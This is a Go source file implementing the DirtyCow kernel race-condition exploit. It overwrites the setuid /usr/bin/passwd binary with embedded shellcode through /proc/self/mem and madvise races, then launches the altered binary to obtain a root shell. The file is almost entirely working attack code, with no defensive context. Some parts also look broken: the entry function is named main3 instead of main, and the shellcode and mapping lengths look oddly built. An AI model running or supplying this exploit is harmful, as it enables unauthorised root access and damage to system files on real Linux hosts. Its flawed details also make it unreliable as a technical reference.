package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"syscall"
	"time"
)

const (
	// Constant for the suid binary path
	suidBinary = "/usr/bin/passwd"

	// Maximum number of race condition attempts
	maxAttempts = 1000000
)

// Shellcode for popping a root shell
var sc = []byte{
	0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
	0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x57,
	0x57, 0x5e, 0x48, 0x89, 0xe1, 0x48, 0x83, 0xc1, 0x08, 0x48, 0x31, 0xd2,
	0x48, 0x83, 0xc2, 0x08, 0x0f, 0x05, 0x48, 0x31, 0xc0, 0x48, 0x83, 0xc0,
	0x3b, 0x48, 0x31, 0xff, 0x57, 0x57, 0x5e, 0x48, 0x89, 0xe1, 0x48, 0x83,
	0xc1, 0x08, 0x48, 0x31, 0xd2, 0x48, 0x83, 0xc2, 0x08, 0x0f, 0x05, 0x68,
	0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05,
}

// Exploit represents the DirtyCow race condition exploit
type Exploit struct {
	signals chan bool
	mapp    uintptr
}

// NewExploit creates a new Exploit instance
func NewExploit() *Exploit {
	return &Exploit{
		signals: make(chan bool, 2),
	}
}

func (e *Exploit) Madvise() {
	for i := 0; i < maxAttempts; i++ {
		select {
		case <-e.signals:
			fmt.Println("Madvise done")
			return
		default:
			syscall.Syscall(syscall.SYS_MADVISE, e.mapp, uintptr(100), syscall.MADV_DONTNEED)
		}
	}
}

func (e *Exploit) Procselfmem(payload []byte) {
	f, err := os.OpenFile("/proc/self/mem", syscall.O_RDWR, 0)
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()

	for i := 0; i < maxAttempts; i++ {
		select {
		case <-e.signals:
			fmt.Println("Procselfmem done")
			return
		default:
			syscall.Syscall(syscall.SYS_LSEEK, f.Fd(), e.mapp, uintptr(io.SeekStart))
			f.Write(payload)
		}
	}
}

func (e *Exploit) WaitForWrite() {
	buf := make([]byte, len(sc))
	for {
		f, err := os.Open(suidBinary)
		if err != nil {
			log.Fatal(err)
		}

		if _, err := f.Read(buf); err != nil {
			log.Fatal(err)
		}
		f.Close()

		if bytes.Equal(buf, sc) {
			fmt.Printf("%s is overwritten\n", suidBinary)
			break
		}
		time.Sleep(1 * time.Second)
	}

	// Signal race condition threads to stop
	e.signals <- true
	e.signals <- true

	fmt.Println("Popping root shell")
	fmt.Println("Don't forget to restore /tmp/bak")

	// Start the modified binary
	attr := os.ProcAttr{
		Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
	}
	proc, err := os.StartProcess(suidBinary, nil, &attr)
	if err != nil {
		log.Fatal(err)
	}
	proc.Wait()
	os.Exit(0)
}

func main3() {
	fmt.Println("DirtyCow root privilege escalation")
	fmt.Printf("Backing up %s to /tmp/bak\n", suidBinary)

	// Backup the original binary
	backup := exec.Command("cp", suidBinary, "/tmp/bak")
	if err := backup.Run(); err != nil {
		log.Fatal(err)
	}

	// Open the binary to modify
	f, err := os.OpenFile(suidBinary, os.O_RDONLY, 0600)
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()

	// Get binary file stats
	st, err := f.Stat()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("Size of binary: %d\n", st.Size())

	// Prepare payload
	payload := make([]byte, st.Size())
	for i := range payload {
		payload[i] = 0x90
	}
	copy(payload, sc)
	exploit := NewExploit()
	exploit.mapp, _, _ = syscall.Syscall6(
		syscall.SYS_MMAP,
		uintptr(0),
		uintptr(st.Size()),
		uintptr(syscall.PROT_READ),
		uintptr(syscall.MAP_PRIVATE),
		f.Fd(),
		0,
	)

	fmt.Println("Racing, this may take a while..")

	go exploit.Madvise()
	go exploit.Procselfmem(payload)
	exploit.WaitForWrite()
}
